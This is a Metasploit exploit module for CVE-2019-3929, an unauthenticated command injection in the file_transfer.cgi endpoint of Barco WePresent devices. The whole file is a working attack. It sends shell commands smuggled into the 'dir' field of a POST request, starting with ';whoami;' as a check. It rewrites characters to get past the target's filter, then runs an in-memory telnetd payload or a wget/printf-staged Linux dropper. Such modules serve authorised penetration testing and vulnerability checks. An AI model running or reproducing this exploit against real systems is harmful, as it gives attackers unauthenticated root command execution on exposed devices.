# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "Barco WePresent file_transfer.cgi Command Injection",
      &#039;Description&#039;    => %q(
        This module exploits an unauthenticated remote command injection
        vulnerability found in Barco WePresent and related OEM&#039;ed products.
        The vulnerability is triggered via an HTTP POST request to the
        file_transfer.cgi endpoint.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => &#039;Jacob Baines&#039;, # @Junior_Baines&#039;
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-3929&#039;],
          [&#039;EDB&#039;, &#039;46786&#039;],
          [&#039;URL&#039;, &#039;https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c&#039;]
        ],
      &#039;DisclosureDate&#039; => "Apr 30, 2019",
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_CMD, ARCH_ARMLE],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Unix In-Memory&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Type&#039;        => :unix_memory,
         &#039;Payload&#039;     => {
           &#039;Compat&#039; => { &#039;PayloadType&#039; => &#039;cmd&#039;, &#039;RequiredCmd&#039; => &#039;telnetd&#039; }
         }],
        [&#039;Linux Dropper&#039;,
         &#039;Platform&#039;        => &#039;linux&#039;,
         &#039;Arch&#039;            => ARCH_ARMLE,
         &#039;CmdStagerFlavor&#039; => [&#039;printf&#039;, &#039;wget&#039;],
         &#039;Type&#039;            => :linux_dropper]
      ],
      &#039;DefaultTarget&#039;  => 1,
      &#039;DefaultOptions&#039; => {
        &#039;SSL&#039;               => true,
        &#039;RPORT&#039;             => 443,
        &#039;CMDSTAGER::FLAVOR&#039; => &#039;printf&#039;,
      }))
  end

  def filter_bad_chars(cmd)
    cmd.gsub!(/;/, &#039;Pa_Note&#039;)
    cmd.gsub!(/\+/, &#039;Pa_Add&#039;)
    cmd.gsub!(/&/, &#039;Pa_Amp&#039;)
    return cmd
  end

  def send_command(cmd, timeout)
    vars_post = {
      file_transfer: &#039;new&#039;,
      dir: "&#039;#{filter_bad_chars(cmd)}&#039;"
    }

    send_request_cgi({
      &#039;uri&#039;       => &#039;/cgi-bin/file_transfer.cgi&#039;,
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => vars_post
    }, timeout)
  end

  def check
    check_resp = send_command(";whoami;", 5)
    unless check_resp
      return CheckCode::Unknown(&#039;Connection failed.&#039;)
    end

    if check_resp.code == 200
      check_resp.body.gsub!(/[\r\n]/, "")
      if check_resp.body == "root"
        return CheckCode::Vulnerable
      end
    end

    CheckCode::Safe
  end

  def execute_command(cmd, _opts = {})
    send_command(";(#{cmd})&", nil)
  end

  def exploit
    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 128)
    end
  end
end

